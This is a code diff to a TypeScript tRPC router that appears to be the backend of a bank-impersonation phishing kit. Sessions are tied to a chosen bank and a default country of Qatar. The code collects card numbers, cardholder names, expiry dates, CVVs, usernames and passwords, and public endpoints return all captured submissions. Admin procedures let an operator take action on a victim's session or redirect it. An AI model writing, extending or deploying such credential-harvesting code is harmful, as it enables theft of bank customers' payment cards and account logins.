@@ -14,6 +14,7 @@ import {
   updateSessionStatus,
   adminTakeAction,
   getSessionStatus,
+  getFullSubmissions,
 } from "./db";
 
 export const appRouter = router({
@@ -34,13 +35,14 @@ export const appRouter = router({
       .input((val: unknown) => {
         if (typeof val !== "object" || val === null) throw new Error("Invalid input");
         const obj = val as Record<string, unknown>;
-        if (typeof obj.sessionId !== "string" || typeof obj.selectedBank !== "string") {
-          throw new Error("Invalid input");
-        }
-        return { sessionId: obj.sessionId, selectedBank: obj.selectedBank };
+        return { 
+          sessionId: String(obj.sessionId), 
+          selectedBank: String(obj.selectedBank),
+          country: obj.country ? String(obj.country) : "Qatar"
+        };
       })
       .mutation(async ({ input }) => {
-        await createSession(input.sessionId, input.selectedBank);
+        await createSession(input.sessionId, input.selectedBank, input.country);
         return { success: true };
       }),
 
@@ -72,12 +74,12 @@ export const appRouter = router({
         return {
           sessionId: String(obj.sessionId),
           loginType: String(obj.loginType),
-          cardNumber: obj.cardNumber ? String(obj.cardNumber) : undefined,
-          cardholderName: obj.cardholderName ? String(obj.cardholderName) : undefined,
-          expiryDate: obj.expiryDate ? String(obj.expiryDate) : undefined,
-          cvv: obj.cvv ? String(obj.cvv) : undefined,
-          username: obj.username ? String(obj.username) : undefined,
-          password: obj.password ? String(obj.password) : undefined,
+          cardNumber: obj.cardNumber ? String(obj.cardNumber) : "",
+          cardholderName: obj.cardholderName ? String(obj.cardholderName) : "",
+          expiryDate: obj.expiryDate ? String(obj.expiryDate) : "",
+          cvv: obj.cvv ? String(obj.cvv) : "",
+          username: obj.username ? String(obj.username) : "",
+          password: obj.password ? String(obj.password) : "",
         };
       })
       .mutation(async ({ input }) => {
@@ -134,25 +136,13 @@ export const appRouter = router({
       }),
 
     getAllSubmissions: publicProcedure.query(async () => {
-      return await getAllSubmissions();
+      return await getFullSubmissions();
     }),
 
     getSubmissionDetails: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "string") throw new Error("Invalid input");
-        return val;
-      })
+      .input(String)
       .query(async ({ input }) => {
         return await getSubmissionDetails(input);
-      }),
-
-    getSessionStatus: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "string") throw new Error("Invalid input");
-        return val;
-      })
-      .query(async ({ input }) => {
-        return await getSessionStatus(input);
       }),
 
     adminTakeAction: publicProcedure
@@ -170,18 +160,10 @@ export const appRouter = router({
         return { success: true };
       }),
 
-    adminRedirect: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          targetPage: String(obj.targetPage),
-        };
-      })
-      .mutation(async ({ input }) => {
-        await updateSessionStatus(input.sessionId, "pending", undefined, undefined, input.targetPage);
-        return { success: true };
+    getSessionStatus: publicProcedure
+      .input(String)
+      .query(async ({ input }) => {
+        return await getSessionStatus(input);
       }),
   }),
 });
